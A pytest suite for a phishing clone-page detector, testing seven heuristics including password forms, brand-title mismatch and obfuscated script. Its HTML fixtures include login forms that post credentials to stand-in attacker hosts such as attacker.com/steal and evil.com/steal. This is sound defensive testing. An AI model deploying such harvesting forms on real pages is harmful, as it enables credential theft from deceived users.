# test_page_clone_detector.py — Cyber Port / phishing-surface-monitor
#
# Tests for analyzers/page_clone_detector.py — PCLN-001 through PCLN-007.
#
# Run with:
#   cd /tmp/phishing-surface-monitor
#   python3 -m pytest --override-ini="addopts=" tests/test_page_clone_detector.py -q

from __future__ import annotations

import sys
import os
import pytest

# Ensure the project root is on sys.path so the analyzers package is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from analyzers.page_clone_detector import (
    PageSignals,
    PCLNCheck,
    CloneDetectionResult,
    analyze,
    analyze_many,
    high_likelihood_clones,
    _truncate,
    _likelihood,
)

# ---------------------------------------------------------------------------
# Helpers / Fixtures
# ---------------------------------------------------------------------------

def make_signals(
    html: str,
    domain: str = "login-secure-bank.xyz",
    brand: str = "bank",
    page_id: str = "test-page",
    url: str = "",
) -> PageSignals:
    """Convenience factory for PageSignals."""
    return PageSignals(
        page_id=page_id,
        domain=domain,
        brand_name=brand,
        html_content=html,
        url=url,
    )


def fired_ids(result: CloneDetectionResult) -> set:
    """Return a set of check_ids from the fired checks."""
    return {c.check_id for c in result.checks_fired}


# ===========================================================================
# PCLN-001 — Login form on non-brand domain
# ===========================================================================

class TestPCLN001:

    # --- Positive triggers ---------------------------------------------------

    def test_password_type_no_action_fires(self):
        html = (
            '<form method="post">'
            '<input type="text" name="user">'
            '<input type="password" name="pwd">'
            '<button type="submit">Login</button>'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" in fired_ids(result)

    def test_password_type_external_action_fires(self):
        html = (
            '<form action="https://evil.com/steal" method="post">'
            '<input type="password" name="pass">'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" in fired_ids(result)

    def test_password_type_empty_action_fires(self):
        html = (
            '<form action="" method="post">'
            '<input type="password" name="pwd">'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" in fired_ids(result)

    def test_password_name_attribute_fires(self):
        """input with name containing 'password' (not type=password) fires."""
        html = (
            '<form method="post">'
            '<input type="text" name="user_password">'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" in fired_ids(result)

    def test_severity_is_critical(self):
        html = (
            '<form><input type="password" name="p"></form>'
        )
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-001")
        assert check.severity == "CRITICAL"

    def test_weight_is_45(self):
        html = '<form><input type="password" name="p"></form>'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-001")
        assert check.weight == 45

    def test_password_with_quotes_single(self):
        html = "<form><input type='password' name='pass'></form>"
        result = analyze(make_signals(html))
        assert "PCLN-001" in fired_ids(result)

    def test_password_with_no_quotes(self):
        html = "<form><input type=password name=pass></form>"
        result = analyze(make_signals(html))
        assert "PCLN-001" in fired_ids(result)

    # --- Negative cases ------------------------------------------------------

    def test_form_without_password_no_fire(self):
        html = (
            '<form action="/search" method="get">'
            '<input type="text" name="query">'
            '<button>Search</button>'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" not in fired_ids(result)

    def test_password_form_action_same_domain_no_fire(self):
        html = (
            '<form action="https://login-secure-bank.xyz/login" method="post">'
            '<input type="password" name="pwd">'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" not in fired_ids(result)

    def test_no_form_at_all_no_fire(self):
        html = '<html><body><p>Just some text</p></body></html>'
        result = analyze(make_signals(html))
        assert "PCLN-001" not in fired_ids(result)

    def test_password_field_same_domain_subdomain_no_fire(self):
        """Action contains the observed domain even as subdomain."""
        html = (
            '<form action="https://login-secure-bank.xyz/auth" method="post">'
            '<input type="password" name="pass">'
            '</form>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-001" not in fired_ids(result)


# ===========================================================================
# PCLN-002 — Brand keyword in title but not in domain
# ===========================================================================

class TestPCLN002:

    # --- Positive triggers ---------------------------------------------------

    def test_brand_in_title_not_in_domain_fires(self):
        html = '<html><head><title>Bank — Secure Login</title></head></html>'
        result = analyze(make_signals(html, domain="totally-legit-site.xyz", brand="bank"))
        assert "PCLN-002" in fired_ids(result)

    def test_case_insensitive_brand_match(self):
        html = '<html><head><title>BANK Login Portal</title></head></html>'
        result = analyze(make_signals(html, domain="totally-legit-site.xyz", brand="bank"))
        assert "PCLN-002" in fired_ids(result)

    def test_severity_is_high(self):
        html = '<title>paypal secure login</title>'
        result = analyze(make_signals(html, domain="evil.xyz", brand="paypal"))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-002")
        assert check.severity == "HIGH"

    def test_weight_is_30(self):
        html = '<title>paypal secure login</title>'
        result = analyze(make_signals(html, domain="evil.xyz", brand="paypal"))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-002")
        assert check.weight == 30

    def test_multiline_title_fires(self):
        html = '<title>\n  Bank Online\n  Banking Portal\n</title>'
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        assert "PCLN-002" in fired_ids(result)

    # --- Negative cases ------------------------------------------------------

    def test_brand_in_domain_no_fire(self):
        html = '<title>Bank Secure Login</title>'
        result = analyze(make_signals(html, domain="bank-login.com", brand="bank"))
        assert "PCLN-002" not in fired_ids(result)

    def test_brand_not_in_title_no_fire(self):
        html = '<title>Welcome to Our Site</title>'
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        assert "PCLN-002" not in fired_ids(result)

    def test_no_title_tag_no_fire(self):
        html = '<html><head></head><body>No title here</body></html>'
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        assert "PCLN-002" not in fired_ids(result)

    def test_brand_in_both_title_and_domain_no_fire(self):
        html = '<title>PayPal — Login</title>'
        result = analyze(make_signals(html, domain="paypal-login.com", brand="paypal"))
        assert "PCLN-002" not in fired_ids(result)


# ===========================================================================
# PCLN-003 — Social media link farming
# ===========================================================================

class TestPCLN003:

    # --- Positive triggers ---------------------------------------------------

    def test_four_platforms_fires(self):
        html = (
            '<a href="https://facebook.com/brand">FB</a>'
            '<a href="https://twitter.com/brand">TW</a>'
            '<a href="https://instagram.com/brand">IG</a>'
            '<a href="https://linkedin.com/brand">LI</a>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-003" in fired_ids(result)

    def test_five_platforms_fires(self):
        html = (
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
            '<a href="https://youtube.com/x">YT</a>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-003" in fired_ids(result)

    def test_seven_platforms_fires(self):
        html = (
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
            '<a href="https://youtube.com/x">YT</a>'
            '<a href="https://tiktok.com/x">TK</a>'
            '<a href="https://x.com/x">X</a>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-003" in fired_ids(result)

    def test_severity_is_medium(self):
        html = (
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
        )
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-003")
        assert check.severity == "MEDIUM"

    def test_weight_is_15(self):
        html = (
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
        )
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-003")
        assert check.weight == 15

    # --- Negative cases ------------------------------------------------------

    def test_three_platforms_no_fire(self):
        html = (
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-003" not in fired_ids(result)

    def test_duplicate_platform_counts_once(self):
        """Multiple links to the same platform count as one distinct platform."""
        html = (
            '<a href="https://facebook.com/page1">FB1</a>'
            '<a href="https://facebook.com/page2">FB2</a>'
            '<a href="https://facebook.com/page3">FB3</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
        )
        # Only 3 distinct platforms (facebook, twitter, instagram)
        result = analyze(make_signals(html))
        assert "PCLN-003" not in fired_ids(result)

    def test_no_social_links_no_fire(self):
        html = '<a href="https://example.com">Home</a>'
        result = analyze(make_signals(html))
        assert "PCLN-003" not in fired_ids(result)

    def test_zero_links_no_fire(self):
        html = '<html><body>No links at all</body></html>'
        result = analyze(make_signals(html))
        assert "PCLN-003" not in fired_ids(result)


# ===========================================================================
# PCLN-004 — Obfuscated JavaScript
# ===========================================================================

class TestPCLN004:

    # --- Positive triggers (each pattern independently) ---------------------

    def test_eval_fires(self):
        html = '<script>eval(encoded_string)</script>'
        result = analyze(make_signals(html))
        assert "PCLN-004" in fired_ids(result)

    def test_unescape_fires(self):
        html = '<script>var x = unescape("%41%42%43");</script>'
        result = analyze(make_signals(html))
        assert "PCLN-004" in fired_ids(result)

    def test_atob_fires(self):
        html = '<script>var decoded = atob("SGVsbG8=");</script>'
        result = analyze(make_signals(html))
        assert "PCLN-004" in fired_ids(result)

    def test_string_from_charcode_fires(self):
        html = '<script>var s = String.fromCharCode(72,101,108,108,111);</script>'
        result = analyze(make_signals(html))
        assert "PCLN-004" in fired_ids(result)

    def test_eval_with_space_fires(self):
        html = '<script>eval (something)</script>'
        result = analyze(make_signals(html))
        assert "PCLN-004" in fired_ids(result)

    def test_severity_is_high(self):
        html = '<script>eval("x")</script>'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-004")
        assert check.severity == "HIGH"

    def test_weight_is_25(self):
        html = '<script>eval("x")</script>'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-004")
        assert check.weight == 25

    def test_obfuscation_in_inline_handler_fires(self):
        html = '<div onclick="eval(this.getAttribute(\'data\'))">click</div>'
        result = analyze(make_signals(html))
        assert "PCLN-004" in fired_ids(result)

    # --- Negative cases ------------------------------------------------------

    def test_no_obfuscation_no_fire(self):
        html = '<script>var x = document.getElementById("id"); x.style.display="none";</script>'
        result = analyze(make_signals(html))
        assert "PCLN-004" not in fired_ids(result)

    def test_plain_html_no_fire(self):
        html = '<html><body><p>Hello world</p></body></html>'
        result = analyze(make_signals(html))
        assert "PCLN-004" not in fired_ids(result)

    def test_partial_function_name_no_fire(self):
        """'evaluate' should not trigger the eval( check (requires parenthesis)."""
        html = '<p>We will evaluate your submission.</p>'
        result = analyze(make_signals(html))
        assert "PCLN-004" not in fired_ids(result)


# ===========================================================================
# PCLN-005 — Anti-indexing meta tag
# ===========================================================================

class TestPCLN005:

    # --- Positive triggers ---------------------------------------------------

    def test_noindex_robots_fires(self):
        html = '<meta name="robots" content="noindex">'
        result = analyze(make_signals(html))
        assert "PCLN-005" in fired_ids(result)

    def test_noindex_combined_fires(self):
        html = '<meta name="robots" content="noindex, nofollow">'
        result = analyze(make_signals(html))
        assert "PCLN-005" in fired_ids(result)

    def test_noindex_case_insensitive_name_fires(self):
        html = '<meta name="ROBOTS" content="noindex">'
        result = analyze(make_signals(html))
        assert "PCLN-005" in fired_ids(result)

    def test_noindex_case_insensitive_content_fires(self):
        html = '<meta name="robots" content="NOINDEX">'
        result = analyze(make_signals(html))
        assert "PCLN-005" in fired_ids(result)

    def test_severity_is_medium(self):
        html = '<meta name="robots" content="noindex">'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-005")
        assert check.severity == "MEDIUM"

    def test_weight_is_20(self):
        html = '<meta name="robots" content="noindex">'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-005")
        assert check.weight == 20

    # --- Negative cases ------------------------------------------------------

    def test_robots_index_no_fire(self):
        html = '<meta name="robots" content="index, follow">'
        result = analyze(make_signals(html))
        assert "PCLN-005" not in fired_ids(result)

    def test_description_meta_no_fire(self):
        html = '<meta name="description" content="noindex not here in name">'
        result = analyze(make_signals(html))
        assert "PCLN-005" not in fired_ids(result)

    def test_no_meta_no_fire(self):
        html = '<html><body><p>Nothing here</p></body></html>'
        result = analyze(make_signals(html))
        assert "PCLN-005" not in fired_ids(result)

    def test_viewport_meta_no_fire(self):
        html = '<meta name="viewport" content="width=device-width, initial-scale=1">'
        result = analyze(make_signals(html))
        assert "PCLN-005" not in fired_ids(result)


# ===========================================================================
# PCLN-006 — External form exfiltration
# ===========================================================================

class TestPCLN006:

    # --- Positive triggers ---------------------------------------------------

    def test_external_http_action_fires(self):
        html = '<form action="http://attacker.com/collect" method="post"><input name="x"></form>'
        result = analyze(make_signals(html))
        assert "PCLN-006" in fired_ids(result)

    def test_external_https_action_fires(self):
        html = '<form action="https://harvester.evil/data" method="post"><input name="x"></form>'
        result = analyze(make_signals(html))
        assert "PCLN-006" in fired_ids(result)

    def test_severity_is_high(self):
        html = '<form action="https://harvester.evil/data" method="post"></form>'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-006")
        assert check.severity == "HIGH"

    def test_weight_is_30(self):
        html = '<form action="https://harvester.evil/data" method="post"></form>'
        result = analyze(make_signals(html))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-006")
        assert check.weight == 30

    # --- Negative cases ------------------------------------------------------

    def test_relative_action_slash_no_fire(self):
        html = '<form action="/submit" method="post"><input name="x"></form>'
        result = analyze(make_signals(html))
        assert "PCLN-006" not in fired_ids(result)

    def test_relative_action_no_protocol_no_fire(self):
        html = '<form action="submit.php" method="post"><input name="x"></form>'
        result = analyze(make_signals(html))
        assert "PCLN-006" not in fired_ids(result)

    def test_empty_action_no_fire_for_pcln006(self):
        """Empty action is handled by PCLN-001; PCLN-006 explicitly skips empty."""
        html = '<form action="" method="post"><input name="x"></form>'
        result = analyze(make_signals(html))
        assert "PCLN-006" not in fired_ids(result)

    def test_same_domain_action_no_fire(self):
        html = '<form action="https://login-secure-bank.xyz/auth" method="post"><input name="x"></form>'
        result = analyze(make_signals(html, domain="login-secure-bank.xyz"))
        assert "PCLN-006" not in fired_ids(result)

    def test_no_form_no_fire(self):
        html = '<html><body><p>No forms here</p></body></html>'
        result = analyze(make_signals(html))
        assert "PCLN-006" not in fired_ids(result)

    def test_form_without_action_no_fire_for_pcln006(self):
        html = '<form method="post"><input name="x"></form>'
        result = analyze(make_signals(html))
        assert "PCLN-006" not in fired_ids(result)


# ===========================================================================
# PCLN-007 — Favicon from brand domain
# ===========================================================================

class TestPCLN007:

    # --- Positive triggers ---------------------------------------------------

    def test_icon_from_brand_domain_fires(self):
        html = '<link rel="icon" href="https://paypal.com/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" in fired_ids(result)

    def test_shortcut_icon_fires(self):
        html = '<link rel="shortcut icon" href="https://mybank.com/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="bank"))
        assert "PCLN-007" in fired_ids(result)

    def test_severity_is_medium(self):
        html = '<link rel="icon" href="https://paypal.com/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-007")
        assert check.severity == "MEDIUM"

    def test_weight_is_20(self):
        html = '<link rel="icon" href="https://paypal.com/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        check = next(c for c in result.checks_fired if c.check_id == "PCLN-007")
        assert check.weight == 20

    def test_href_before_rel_fires(self):
        html = '<link href="https://paypal.com/favicon.ico" rel="icon">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" in fired_ids(result)

    def test_brand_in_subdomain_of_favicon_fires(self):
        html = '<link rel="icon" href="https://cdn.paypal.com/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" in fired_ids(result)

    # --- Negative cases ------------------------------------------------------

    def test_favicon_on_same_domain_no_fire(self):
        html = '<link rel="icon" href="https://evil-clone.xyz/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" not in fired_ids(result)

    def test_relative_favicon_no_fire(self):
        html = '<link rel="icon" href="/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" not in fired_ids(result)

    def test_favicon_domain_no_brand_keyword_no_fire(self):
        html = '<link rel="icon" href="https://cdn.example.com/favicon.ico">'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" not in fired_ids(result)

    def test_no_link_tag_no_fire(self):
        html = '<html><head><title>Page</title></head></html>'
        result = analyze(make_signals(html, domain="evil-clone.xyz", brand="paypal"))
        assert "PCLN-007" not in fired_ids(result)


# ===========================================================================
# clone_likelihood threshold tests
# ===========================================================================

class TestCloneLikelihood:

    def test_score_0_is_minimal(self):
        assert _likelihood(0) == "MINIMAL"

    def test_score_9_is_minimal(self):
        assert _likelihood(9) == "MINIMAL"

    def test_score_10_is_low(self):
        assert _likelihood(10) == "LOW"

    def test_score_29_is_low(self):
        assert _likelihood(29) == "LOW"

    def test_score_30_is_medium(self):
        assert _likelihood(30) == "MEDIUM"

    def test_score_59_is_medium(self):
        assert _likelihood(59) == "MEDIUM"

    def test_score_60_is_high(self):
        assert _likelihood(60) == "HIGH"

    def test_score_100_is_high(self):
        assert _likelihood(100) == "HIGH"

    def test_result_minimal_no_checks(self):
        html = '<html><body><p>Safe page</p></body></html>'
        result = analyze(make_signals(html))
        assert result.clone_likelihood == "MINIMAL"
        assert result.risk_score == 0

    def test_result_high_multiple_critical_checks(self):
        # PCLN-001 (45) + PCLN-002 (30) = 75 → HIGH
        html = (
            '<title>Bank Login</title>'
            '<form method="post">'
            '<input type="password" name="pwd">'
            '</form>'
        )
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        assert result.clone_likelihood == "HIGH"
        assert result.risk_score >= 60

    def test_risk_score_capped_at_100(self):
        # Fire all 7 checks: weights 45+30+15+25+20+30+20 = 185, capped at 100
        html = (
            '<title>Bank Login</title>'
            '<meta name="robots" content="noindex">'
            '<link rel="icon" href="https://bank.com/favicon.ico">'
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
            '<script>eval("obf")</script>'
            '<form action="https://attacker.com/steal" method="post">'
            '<input type="password" name="pwd">'
            '</form>'
        )
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        assert result.risk_score <= 100

    def test_medium_threshold(self):
        # Only PCLN-005 (20) + PCLN-003 (15) = 35 → MEDIUM
        html = (
            '<meta name="robots" content="noindex">'
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
        )
        result = analyze(make_signals(html))
        assert result.clone_likelihood == "MEDIUM"
        assert result.risk_score == 35


# ===========================================================================
# kit_signals count tests
# ===========================================================================

class TestKitSignals:

    def test_no_checks_kit_signals_zero(self):
        html = '<html><body><p>Safe page</p></body></html>'
        result = analyze(make_signals(html))
        assert result.kit_signals == 0

    def test_one_check_kit_signals_one(self):
        html = '<meta name="robots" content="noindex">'
        result = analyze(make_signals(html))
        assert result.kit_signals == 1

    def test_two_checks_kit_signals_two(self):
        html = (
            '<meta name="robots" content="noindex">'
            '<script>eval("x")</script>'
        )
        result = analyze(make_signals(html))
        assert result.kit_signals == 2

    def test_kit_signals_matches_checks_fired_len(self):
        html = (
            '<title>Bank Login</title>'
            '<meta name="robots" content="noindex">'
            '<script>atob("abc")</script>'
        )
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        assert result.kit_signals == len(result.checks_fired)


# ===========================================================================
# high_likelihood_clones() tests
# ===========================================================================

class TestHighLikelihoodClones:

    def _make_result(self, page_id: str, score: int, likelihood: str) -> CloneDetectionResult:
        return CloneDetectionResult(
            page_id=page_id,
            domain="test.xyz",
            brand_name="brand",
            checks_fired=[],
            risk_score=score,
            clone_likelihood=likelihood,
            kit_signals=0,
        )

    def test_filters_only_high(self):
        results = [
            self._make_result("a", 80, "HIGH"),
            self._make_result("b", 40, "MEDIUM"),
            self._make_result("c", 75, "HIGH"),
            self._make_result("d", 5, "MINIMAL"),
        ]
        filtered = high_likelihood_clones(results)
        assert all(r.clone_likelihood == "HIGH" for r in filtered)
        assert len(filtered) == 2

    def test_sorted_by_risk_score_descending(self):
        results = [
            self._make_result("low", 61, "HIGH"),
            self._make_result("high", 95, "HIGH"),
            self._make_result("mid", 75, "HIGH"),
        ]
        filtered = high_likelihood_clones(results)
        scores = [r.risk_score for r in filtered]
        assert scores == sorted(scores, reverse=True)

    def test_empty_list_returns_empty(self):
        assert high_likelihood_clones([]) == []

    def test_no_high_returns_empty(self):
        results = [
            self._make_result("a", 40, "MEDIUM"),
            self._make_result("b", 5, "MINIMAL"),
        ]
        assert high_likelihood_clones(results) == []

    def test_real_analysis_high_likelihood(self):
        # Fire PCLN-001 (45) + PCLN-002 (30) = 75 → HIGH
        html = (
            '<title>Bank Login</title>'
            '<form method="post"><input type="password" name="pwd"></form>'
        )
        results = [analyze(make_signals(html, domain="evil.xyz", brand="bank"))]
        filtered = high_likelihood_clones(results)
        assert len(filtered) == 1
        assert filtered[0].clone_likelihood == "HIGH"


# ===========================================================================
# analyze_many() tests
# ===========================================================================

class TestAnalyzeMany:

    def test_returns_correct_count(self):
        pages = [
            make_signals('<html><body>Page 1</body></html>', page_id="p1"),
            make_signals('<html><body>Page 2</body></html>', page_id="p2"),
            make_signals('<html><body>Page 3</body></html>', page_id="p3"),
        ]
        results = analyze_many(pages)
        assert len(results) == 3

    def test_preserves_order(self):
        pages = [
            make_signals('<html/>', page_id="first"),
            make_signals('<html/>', page_id="second"),
        ]
        results = analyze_many(pages)
        assert results[0].page_id == "first"
        assert results[1].page_id == "second"

    def test_empty_list_returns_empty(self):
        assert analyze_many([]) == []

    def test_each_result_is_clone_detection_result(self):
        pages = [make_signals('<html/>', page_id="x")]
        results = analyze_many(pages)
        assert all(isinstance(r, CloneDetectionResult) for r in results)

    def test_independent_analysis(self):
        """Each page is analyzed independently."""
        clean = make_signals('<html><body>Clean</body></html>', page_id="clean")
        phish = make_signals(
            '<title>Bank Login</title><form><input type="password" name="p"></form>',
            domain="evil.xyz",
            brand="bank",
            page_id="phish",
        )
        results = analyze_many([clean, phish])
        assert results[0].kit_signals == 0
        assert results[1].kit_signals >= 2


# ===========================================================================
# to_dict() / summary() / by_severity() shape tests
# ===========================================================================

class TestResultMethods:

    def _phishing_result(self) -> CloneDetectionResult:
        html = (
            '<title>Bank Login</title>'
            '<meta name="robots" content="noindex">'
            '<script>eval("x")</script>'
            '<form method="post"><input type="password" name="pwd"></form>'
        )
        return analyze(make_signals(html, domain="evil.xyz", brand="bank", page_id="p42"))

    def test_to_dict_has_required_keys(self):
        result = self._phishing_result()
        d = result.to_dict()
        for key in ("page_id", "domain", "brand_name", "risk_score",
                    "clone_likelihood", "kit_signals", "checks_fired"):
            assert key in d

    def test_to_dict_checks_fired_is_list(self):
        result = self._phishing_result()
        d = result.to_dict()
        assert isinstance(d["checks_fired"], list)

    def test_to_dict_check_item_has_required_keys(self):
        result = self._phishing_result()
        d = result.to_dict()
        for item in d["checks_fired"]:
            for key in ("check_id", "severity", "description", "evidence", "weight"):
                assert key in item

    def test_to_dict_is_json_serialisable(self):
        import json
        result = self._phishing_result()
        # Should not raise
        serialized = json.dumps(result.to_dict())
        assert isinstance(serialized, str)

    def test_summary_contains_page_id(self):
        result = self._phishing_result()
        assert "p42" in result.summary()

    def test_summary_contains_domain(self):
        result = self._phishing_result()
        assert "evil.xyz" in result.summary()

    def test_summary_contains_clone_likelihood(self):
        result = self._phishing_result()
        assert result.clone_likelihood in result.summary()

    def test_summary_contains_risk_score(self):
        result = self._phishing_result()
        assert str(result.risk_score) in result.summary()

    def test_summary_is_string(self):
        result = self._phishing_result()
        assert isinstance(result.summary(), str)

    def test_by_severity_groups_correctly(self):
        result = self._phishing_result()
        groups = result.by_severity()
        # All checks in a group must have the matching severity
        for severity, checks in groups.items():
            for check in checks:
                assert check.severity == severity

    def test_by_severity_covers_all_checks(self):
        result = self._phishing_result()
        groups = result.by_severity()
        total = sum(len(v) for v in groups.values())
        assert total == len(result.checks_fired)

    def test_by_severity_returns_dict(self):
        result = self._phishing_result()
        assert isinstance(result.by_severity(), dict)

    def test_clean_page_to_dict(self):
        html = '<html><body>Safe</body></html>'
        result = analyze(make_signals(html, page_id="safe1"))
        d = result.to_dict()
        assert d["risk_score"] == 0
        assert d["checks_fired"] == []

    def test_clean_page_summary_minimal(self):
        html = '<html><body>Safe</body></html>'
        result = analyze(make_signals(html, page_id="safe1"))
        assert "MINIMAL" in result.summary()


# ===========================================================================
# Evidence truncation tests
# ===========================================================================

class TestEvidenceTruncation:

    def test_truncate_short_string_unchanged(self):
        s = "short string"
        assert _truncate(s) == s

    def test_truncate_exactly_200_unchanged(self):
        s = "a" * 200
        assert _truncate(s) == s
        assert len(_truncate(s)) == 200

    def test_truncate_201_chars_truncated(self):
        s = "a" * 201
        result = _truncate(s)
        assert len(result) == 201  # 200 chars + ellipsis character (1 char)
        assert result.endswith("…")

    def test_truncate_large_string(self):
        s = "x" * 1000
        result = _truncate(s)
        assert result.endswith("…")
        # 200 content chars + 1 ellipsis char
        assert len(result) == 201

    def test_evidence_field_max_200_chars_content(self):
        """Evidence in a fired check should have at most 200 content chars + possible ellipsis."""
        # Create a very long HTML form to ensure truncation
        long_attr = "a" * 500
        html = (
            f'<form data-extra="{long_attr}" method="post">'
            f'<input type="password" name="pwd">'
            f'</form>'
        )
        result = analyze(make_signals(html))
        for check in result.checks_fired:
            # Evidence content before ellipsis should be ≤ 200 chars
            evidence = check.evidence
            if evidence.endswith("…"):
                assert len(evidence) == 201  # 200 + ellipsis
            else:
                assert len(evidence) <= 200

    def test_pcln004_evidence_truncated_for_long_match(self):
        long_js = "var a = " + "b" * 300 + "; eval(longString);"
        html = f'<script>{long_js}</script>'
        result = analyze(make_signals(html))
        if "PCLN-004" in fired_ids(result):
            check = next(c for c in result.checks_fired if c.check_id == "PCLN-004")
            assert len(check.evidence) <= 201  # 200 chars + possible ellipsis


# ===========================================================================
# PageSignals dataclass tests
# ===========================================================================

class TestPageSignals:

    def test_default_url_empty(self):
        s = PageSignals(
            page_id="x",
            domain="d.com",
            brand_name="brand",
            html_content="<html/>",
        )
        assert s.url == ""

    def test_explicit_url_stored(self):
        s = PageSignals(
            page_id="x",
            domain="d.com",
            brand_name="brand",
            html_content="<html/>",
            url="https://d.com/page",
        )
        assert s.url == "https://d.com/page"


# ===========================================================================
# PCLNCheck dataclass tests
# ===========================================================================

class TestPCLNCheck:

    def test_fields_accessible(self):
        c = PCLNCheck(
            check_id="PCLN-001",
            severity="CRITICAL",
            description="desc",
            evidence="evidence",
            weight=45,
        )
        assert c.check_id == "PCLN-001"
        assert c.severity == "CRITICAL"
        assert c.weight == 45


# ===========================================================================
# Edge cases / integration
# ===========================================================================

class TestEdgeCases:

    def test_empty_html(self):
        result = analyze(make_signals(""))
        assert result.risk_score == 0
        assert result.clone_likelihood == "MINIMAL"

    def test_html_only_whitespace(self):
        result = analyze(make_signals("   \n\t  "))
        assert result.risk_score == 0

    def test_multiple_forms_only_one_fires(self):
        """Multiple forms present; only the dangerous one should fire PCLN-001."""
        html = (
            '<form action="/search"><input type="text" name="q"></form>'
            '<form method="post"><input type="password" name="pwd"></form>'
        )
        result = analyze(make_signals(html))
        count = sum(1 for c in result.checks_fired if c.check_id == "PCLN-001")
        assert count == 1  # PCLN-001 fires once (returns on first match)

    def test_pcln001_and_pcln006_can_both_fire(self):
        """A form with password AND external action can trigger both PCLN-001 and PCLN-006."""
        html = (
            '<form action="https://attacker.com/steal" method="post">'
            '<input type="password" name="pwd">'
            '</form>'
        )
        result = analyze(make_signals(html))
        ids = fired_ids(result)
        assert "PCLN-001" in ids
        assert "PCLN-006" in ids

    def test_clone_detection_result_page_id_preserved(self):
        result = analyze(make_signals('<html/>', page_id="unique-id-123"))
        assert result.page_id == "unique-id-123"

    def test_clone_detection_result_domain_preserved(self):
        result = analyze(make_signals('<html/>', domain="my-domain.xyz"))
        assert result.domain == "my-domain.xyz"

    def test_clone_detection_result_brand_preserved(self):
        result = analyze(make_signals('<html/>', brand="mybrand"))
        assert result.brand_name == "mybrand"

    def test_pcln003_x_com_platform_counts(self):
        """x.com is a valid social platform (formerly Twitter's domain)."""
        html = (
            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
            '<a href="https://x.com/brand">X</a>'
        )
        result = analyze(make_signals(html))
        assert "PCLN-003" in fired_ids(result)

    def test_pcln002_evidence_contains_title_text(self):
        html = '<title>Bank Secure Access Portal</title>'
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        if "PCLN-002" in fired_ids(result):
            check = next(c for c in result.checks_fired if c.check_id == "PCLN-002")
            assert "Bank" in check.evidence or "bank" in check.evidence.lower()

    def test_all_seven_checks_can_fire_simultaneously(self):
        html = (
            '<title>Bank Secure Login</title>'
            '<meta name="robots" content="noindex, nofollow">'
            '<link rel="icon" href="https://bank.com/favicon.ico">'
